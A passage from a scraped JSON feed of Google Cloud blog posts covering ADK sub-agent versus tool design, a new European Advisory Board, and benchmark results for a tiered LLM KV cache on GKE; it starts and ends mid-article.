baseline;\">Hierarchical delegation:</strong><span style=\"vertical-align: baseline;\"> The parent agent explicitly delegates a high-level task and lets the sub-agent manage the process.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Here is a simple decision matrix that you can use to guide your architectural decision based on the task:</span></p>\n<div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table style=\"width: 100%;\"><colgroup><col style=\"width: 18.4314%;\" /><col style=\"width: 19.7386%;\" /><col style=\"width: 17.2518%;\" /><col style=\"width: 44.5782%;\" /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Criterion</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Agent as a tool</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Sub-agent</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Decision</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Task complexity</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Low to Medium</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">High</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Use a </span><strong style=\"vertical-align: baseline;\">tool</strong><span style=\"vertical-align: baseline;\"> for atomic functions. Use a </span><strong style=\"vertical-align: baseline;\">sub-agent</strong><span style=\"vertical-align: baseline;\"> for complex workflows.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Context &amp; state</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Isolated/None</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Shared</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">If the task is stateless, use a </span><strong style=\"vertical-align: baseline;\">tool</strong><span style=\"vertical-align: baseline;\">. If it requires conversational context, use a </span><strong style=\"vertical-align: baseline;\">sub-agent</strong><span style=\"vertical-align: baseline;\">.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Reusability</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">High</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Low to Medium</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">For generic, widely applicable capabilities, build a </span><strong style=\"vertical-align: baseline;\">tool</strong><span style=\"vertical-align: baseline;\">. For specialized roles in a specific process, use a </span><strong style=\"vertical-align: baseline;\">sub-agent</strong><span style=\"vertical-align: baseline;\">.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Autonomy &amp; control</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Low</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">High</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Use a </span><strong style=\"vertical-align: baseline;\">tool</strong><span style=\"vertical-align: baseline;\"> for a simple request-response. Use a </span><strong style=\"vertical-align: baseline;\">sub-agent</strong><span style=\"vertical-align: baseline;\"> for delegating a whole sub-problem.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<h3><strong style=\"vertical-align: baseline;\">Use cases in action</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Let's apply this framework to some real-world scenarios.\u00a0</span></p>\n<p><strong style=\"vertical-align: baseline;\">Use case 1: The data agent (NL2SQL and visualization)</strong></p>\n<p><span style=\"vertical-align: baseline;\">A business user asks for the top 5 product sales in Q2 by region and wants a bar chart.\u00a0</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Root Agent : </strong><span style=\"vertical-align: baseline;\">Receives the business user's request (NL), determines the necessary steps (SQL generation \u2192 Execution \u2192 Visualization), and delegates/sequences the tasks, before returning the response to the user.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">NL2SQL Agent:</strong><span style=\"vertical-align: baseline;\"> Use a </span><strong style=\"vertical-align: baseline;\">tool</strong><span style=\"vertical-align: baseline;\">. The task is a single, reusable function: convert natural language to a SQL string, using metadata &amp; schema for grounding.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Database Executor:</strong><span style=\"vertical-align: baseline;\"> Use a </span><strong style=\"vertical-align: baseline;\">tool</strong><span style=\"vertical-align: baseline;\">. This is a simple, deterministic function to execute the query and return data.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Data Visualization Agent:</strong><span style=\"vertical-align: baseline;\"> Use a </span><strong style=\"vertical-align: baseline;\">sub-agent</strong><span style=\"vertical-align: baseline;\">. The task is complex and multi-step. It involves analyzing the data returned by the database tool, and the original user query, selecting the right chart type, generating the visualization code, and executing it. Delegating this to a sub-agent allows the main orchestrator agent to maintain a high-level view while the sub-agent independently manages its complex internal workflow.</span></p>\n</li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Use case 2: The sophisticated travel planner</strong></p>\n<p><span style=\"vertical-align: baseline;\">A user asks to plan a 5-day anniversary trip to Paris, with specific preferences for flights, hotels, and activities. This is an ambiguous, high-level goal that requires continuous context and planning.\u00a0</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Travel planner: </strong><span style=\"vertical-align: baseline;\">Use a </span><strong style=\"vertical-align: baseline;\">root agent</strong><span style=\"vertical-align: baseline;\">, to maintain the overall goal (\"5-day anniversary trip to Paris\"),manage the flow between sub-agents, and aggregate the final itinerary.<br /><br /></span><span style=\"font-style: italic; vertical-align: baseline;\">Note: </span><span style=\"vertical-align: baseline;\">You could implement a Context/Memory Manager Tool accessible to all agents, potentially using a simple key-value store (like Redis or a simple database) to delegate the storage of immutable decisions.\u00a0</span></p>\n</li>\n</ul>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Flight search:</strong><span style=\"vertical-align: baseline;\"> Use a </span><strong style=\"vertical-align: baseline;\">sub-agent</strong><span style=\"vertical-align: baseline;\">. The task is not a simple search; involving multiple back-and-forth interactions with the user (e.g., \"Is a layover in Dubai okay?\") while managing the overall trip context (dates, destination, class). </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hotel booking:</strong><span style=\"vertical-align: baseline;\"> Use a </span><strong style=\"vertical-align: baseline;\">sub-agent</strong><span style=\"vertical-align: baseline;\">. It needs to maintain state and context (dates, location preference, 5-star rating) as it searches for and presents options.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Itinerary generation:</strong><span style=\"vertical-align: baseline;\"> Use a </span><strong style=\"vertical-align: baseline;\">sub-agent</strong><span style=\"vertical-align: baseline;\"> to generate a logical, day-by-day itinerary. The agent must combine confirmed flights/hotels with user interests (e.g., art museums, fine dining), potentially using its own booking tools.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Using tools is inefficient; each call requires the full trip context, leading to redundancy and state loss. Sub-agents are better for these stateful, collaborative processes as they share session context.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get started</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The decision between sub-agents and agents as tools is fundamental to designing an effective and scalable agentic system in ADK. As a guiding principle, remember:\u00a0</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Use tools</strong><span style=\"vertical-align: baseline;\"> for discrete, stateless, and reusable capabilities. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Use sub-agents</strong><span style=\"vertical-align: baseline;\"> to manage complex, stateful, and context-dependent processes. </span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">By mastering this architectural pattern, you can design multi-agent systems that are modular and capable of solving complex, real-world problems.\u00a0</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Check out these </span><a href=\"https://github.com/google/adk-samples\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">examples</span></a><span style=\"vertical-align: baseline;\"> on GitHub to start building using ADK.\u00a0</span></p>\n</li>\n<li><span style=\"vertical-align: baseline;\">Here is a fantastic </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/build-multi-agentic-systems-using-google-adk\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blogpost</span></a><span style=\"vertical-align: baseline;\"> that will help you build your first multi-agent workflow.</span></li>\n</ul></div>",
        "published_date": "2025-11-07 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/customers/google-cloud-europe-establishes-new-advisory-board/",
        "title": "Google Cloud Europe establishes new European Advisory Board",
        "thumbnail": null,
        "author": "Tara Brady",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Across the world, organizations are partnering with Google Cloud to tackle their toughest challenges, drive digital transformation, and unlock new levels of growth. In Europe, organizations face unique and complex regulatory challenges. To ensure we're delivering the best possible value and experience for our customers here, we have established a new European Advisory Board. This distinguished group of leaders from across various industries will act as a vital feedback channel, help customers navigate complex regulatory landscapes, and foster a strong, sustainable digital economy. Their counsel is key to ensuring Google Cloud products not only meet but exceed European requirements, driving our regional expertise and differentiation and ultimately supporting Europe\u2019s digital transformation.</span></p>\n<p><span style=\"vertical-align: baseline;\">The board comprises renowned leaders with deep expertise spanning technology, finance, retail, and public service.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">The new board members are:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Jim Snabe (Chair):</strong><span style=\"vertical-align: baseline;\"> A global business leader and current Chairman of Siemens AG. With a long career at the intersection of technology and innovation, including his time as Co-CEO of SAP AG, Jim brings deep expertise in guiding multinational organizations through digital transformation and growth. His leadership will be pivotal in steering the board\u2019s strategic direction.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Stefan F Heidenreich:</strong><span style=\"vertical-align: baseline;\"> A business leader with extensive experience in the consumer goods industry, including as Chairman of the Management Board and CEO of Beiersdorf AG. His knowledge of brand management, market strategy, and organizational leadership will provide valuable commercial insights.</span><span style=\"vertical-align: baseline;\">\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Nigel Hinshelwood:</strong><span style=\"vertical-align: baseline;\"> An expert in financial services with significant leadership roles at institutions like HSBC and Lloyds Banking Group. His understanding of Europe\u2019s financial sector and regulatory environment will be crucial for guiding Google Cloud's work with major banking and financial services clients.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Christophe Cuvillier:</strong><span style=\"vertical-align: baseline;\"> A prominent French businessman and former CEO of Unibail-Rodamco-Westfield. With a background in luxury, retail, and real estate, Christophe's perspective on customer-centricity and business transformation in the consumer sector will be a key asset to the board.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Tim Radford (from Jan 2026):</strong><span style=\"vertical-align: baseline;\"> A former British military leader and operational commander with a background in defense and large-scale project delivery. His insights into leveraging technology to achieve strategic business objectives will be vital to the board's discussions.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">\"It is a privilege to chair Google Cloud\u2019s EMEA advisory board,\" said Jim Snabe. \"Europe is at a critical juncture in its digital evolution. This board's mission is to provide counsel that helps Google Cloud not only accelerate innovation but also ensure it is done in a way that aligns with Europe\u2019s values and priorities, fostering a secure and inclusive digital future.\"</span></p>\n<p><span style=\"vertical-align: baseline;\">The formation of this board underscores Google Cloud's ongoing commitment to a European-first strategy, collaborating closely with local leaders to build technology solutions that are tailored to the continent's unique needs and opportunities. The board will meet periodically to advise Google Cloud leadership on a range of strategic issues, from product development and market entry to policy and sustainability initiatives.</span></p></div>",
        "published_date": "2025-11-07 16:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/developers-practitioners/boosting-llm-performance-with-tiered-kv-cache-on-google-kubernetes-engine/",
        "title": "Boosting LLM Performance with Tiered KV Cache on Google Kubernetes Engine",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/heroimageblog.max-600x600.png",
        "author": "Danna Wang",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Large Language Models (LLMs) are powerful, but their performance can be bottlenecked by the immense NVIDIA GPU memory footprint of the Key-Value (KV) Cache. This cache, crucial for speeding up LLM inference by storing Key (K) and Value (V) matrices, directly impacts context length, concurrency, and overall system throughput. Our primary goal is to maximize the KV Cache hit ratio by intelligently expanding NVIDIA GPU High Bandwidth Memory (HBM) with a tiered node-local storage solution.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our collaboration with the LMCache team (Kuntai Du, Jiayi Yao, and Yihua Cheng from Tensormesh) has led to the development of an innovative solution on Google Kubernetes Engine (GKE).</span></p>\n<h2><span style=\"vertical-align: baseline;\">T</span><span style=\"vertical-align: baseline;\">iered Storage: Expanding the KV Cache Beyond HBM</span></h2>\n<p><span style=\"vertical-align: baseline;\">LMCache extends the KV Cache from the NVIDIA GPU's fast HBM (Tier 1) to larger, more cost-effective tiers like CPU RAM and local SSDs. This dramatically increases the total cache size, leading to a higher hit ratio and improved inference performance by keeping more data locally on the accelerator node. For GKE users, this means accommodating models with massive context windows while maintaining excellent performance.</span></p>\n<h2><strong style=\"vertical-align: baseline;\">Performance Benchmarking and Results</strong></h2>\n<p><span style=\"vertical-align: baseline;\">We designed tests to measure the performance of this tiered KV Cache by configuring workloads to fill each storage layer (HBM, CPU RAM, Local SSD). We benchmarked these configurations using various context lengths (1k, 5k, 10k, 50k, and 100k tokens), representing diverse use cases such as:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">1k - 5k tokens:</strong><span style=\"vertical-align: baseline;\"> High-fidelity personas and complex instructions</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">10k tokens:</strong><span style=\"vertical-align: baseline;\"> Average user prompts (small RAG) or web page/article content</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">50k tokens:</strong><span style=\"vertical-align: baseline;\"> Prompt stuffing</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">100k tokens:</strong><span style=\"vertical-align: baseline;\"> Content equivalent to a long book</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Our primary performance indicators were Time to First Token (TTFT), token input throughput, and end-to-end latency. The results highlight the best-performing storage setup for each KV Cache size and the performance improvements achieved.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Experiment Setup</span></h2>\n<p><span style=\"vertical-align: baseline;\">We deployed a vLLM server on an </span><a href=\"https://cloud.google.com/compute/docs/gpus#h100-gpus\"><span style=\"text-decoration: underline; vertical-align: baseline;\">A3 mega machine</span></a><span style=\"vertical-align: baseline;\">, leveraging local SSD for ephemeral storage via </span><code style=\"vertical-align: baseline;\">emptyDir</code><span style=\"vertical-align: baseline;\">.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Hardware:</strong><span style=\"vertical-align: baseline;\"> 8 \u00d7 nvidia-h100-mega-80gb NVIDIA GPUs</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Model:</strong><span style=\"vertical-align: baseline;\"> </span><a href=\"https://huggingface.co/meta-llama/Llama-3.3-70B-Instruct\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Llama-3.3-70B-Instruct</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">LMCache version:</strong><span style=\"vertical-align: baseline;\"> </span><a href=\"https://hub.docker.com/layers/lmcache/vllm-openai/v0.3.3/images/sha256-51eb3ca2e0f93cd9b4f44b099ef4e13f6290eaafbf814ac1c23494d2c25bf8a9\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">v0.3.3</span></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Cache Configuration:</strong></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">HBM only</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">HBM + CPU RAM</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">HBM + CPU RAM + Local SSD</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Storage Resources:</strong><span style=\"vertical-align: baseline;\"> HBM: 640Gi, CPU RAM: 1Ti, Local SSD: 5Ti</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Benchmark Tool:</strong><span style=\"vertical-align: baseline;\"> </span><a href=\"https://github.com/sgl-project/sglang/blob/main/python/sglang/bench_serving.py\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">SGLang bench_serving</span></a></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\"><strong style=\"vertical-align: baseline;\">Requests:</strong><span style=\"vertical-align: baseline;\"> Tests were conducted with system prompt lengths of 1k, 5k, 10k, 50k, and 100k tokens. Each system prompt provided a shared context for a batch of 20 inference requests, with individual requests consisting of a unique 256-token input and generating a 512-token output.</span></span></p>\n<p><strong style=\"vertical-align: baseline;\">Example Command:</strong></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;python3 sglang/bench_serving.py --host=${IP} --port=${PORT} --dataset-name=&#x27;generated-shared-prefix&#x27; --model=$MODEL --tokenizer=$MODEL --backend=vllm --gsp-num-groups=80 --gsp-&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f9153bd4310&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Benchmark Results</span></h2>\n<p><span style=\"vertical-align: baseline;\">Our tests explored different total KV Cache sizes. The following results highlight the optimal storage setup for each size and the performance improvements achieved:</span></p>\n<h3><span style=\"vertical-align: baseline;\">Test 1: Cache (1.1M - 1.3M tokens) fits entirely within HBM</span></h3>\n<p><strong style=\"vertical-align: baseline;\">Results:</strong><span style=\"vertical-align: baseline;\"> In this scenario, adding slower storage tiers provided no advantage, making an HBM-only configuration the optimal setup.</span></p>\n<h3><span style=\"vertical-align: baseline; color: #202124;\"><span style=\"vertical-align: baseline;\">Test 2: Cache (4.0M - 4.3M tokens) exceeds HBM capacity but fits within HBM + CPU RAM</span></span></h3>\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\" style=\"border-collapse: collapse; width: 100%; height: 179.187px;\">\n<tbody>\n<tr style=\"height: 67.1953px;\">\n<td style=\"width: 20%; text-align: center; height: 67.1953px;\"><strong><span style=\"vertical-align: baseline;\">System Prompt Length</span></strong></td>\n<td style=\"width: 20%; text-align: center; height: 67.1953px;\"><strong><span style=\"vertical-align: baseline;\">Best-performing Storage Setup</span></strong></td>\n<td style=\"width: 20%; text-align: center; height: 67.1953px;\"><strong><span style=\"vertical-align: baseline;\">Mean TTFT (ms) Change (%) vs. HBM only</span></strong></td>\n<td style=\"width: 20%; text-align: center; height: 67.1953px;\"><strong><span style=\"vertical-align: baseline;\">Input Throughput Change (%) vs. HBM only</span></strong></td>\n<td style=\"width: 20%; text-align: center; height: 67.1953px;\"><strong><span style=\"vertical-align: baseline;\">Mean End-to-End Latency Change (%) vs. HBM only</span></strong></td>\n</tr>\n<tr style=\"height: 22.3984px;\">\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">1000</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">HBM</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">0%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">0%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">0%</span></td>\n</tr>\n<tr style=\"height: 22.3984px;\">\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">5000</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">-18%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">+16%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">-14%</span></td>\n</tr>\n<tr style=\"height: 22.3984px;\">\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">10000</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">-44%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">+50%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">-33%</span></td>\n</tr>\n<tr style=\"height: 22.3984px;\">\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">50000</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM + Local SSD</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">-68%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">+179%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">-64%</span></td>\n</tr>\n<tr style=\"height: 22.3984px;\">\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">100000</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM + Local SSD</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">-79%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">+264%</span></td>\n<td style=\"width: 20%; height: 22.3984px;\"><span style=\"vertical-align: baseline;\">-73%</span></td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<h3><span style=\"vertical-align: baseline; color: #202124;\">Test 3: Large cache (12.6M - 13.7M tokens) saturates HBM and CPU RAM, spilling to Local SSD</span></h3>\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table border=\"1\">\n<tbody>\n<tr>\n<td style=\"text-align: center; border: 1px solid #000000; padding: 16px;\"><strong><span style=\"vertical-align: baseline;\">System Prompt Length</span></strong></td>\n<td style=\"text-align: center; border: 1px solid #000000; padding: 16px;\"><strong><span style=\"vertical-align: baseline;\">Best-performing Storage Setup</span></strong></td>\n<td style=\"text-align: center; border: 1px solid #000000; padding: 16px;\"><strong><span style=\"vertical-align: baseline;\">Mean TTFT (ms) Change (%) vs. HBM only</span></strong></td>\n<td style=\"text-align: center; border: 1px solid #000000; padding: 16px;\"><strong><span style=\"vertical-align: baseline;\">Input Throughput Change (%) vs. HBM only</span></strong></td>\n<td style=\"text-align: center; border: 1px solid #000000; padding: 16px;\"><strong><span style=\"vertical-align: baseline;\">Mean End-to-End Latency Change (%) vs. HBM only</span></strong></td>\n</tr>\n<tr>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">1000</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">+5%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">+1%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">-1%</span></td>\n</tr>\n<tr>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">5000</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">-6%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">+27%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">-21%</span></td>\n</tr>\n<tr>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">10000</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">+121%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">+23%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">-19%</span></td>\n</tr>\n<tr>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">50000</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">HBM + CPU RAM + Local SSD</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">+48%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">+69%</span></td>\n<td style=\"border: 1px solid #000000; padding: 16px;\"><span style=\"vertical-align: baseline;\">-41%</span></td>\n</tr>\n<tr>\n<td 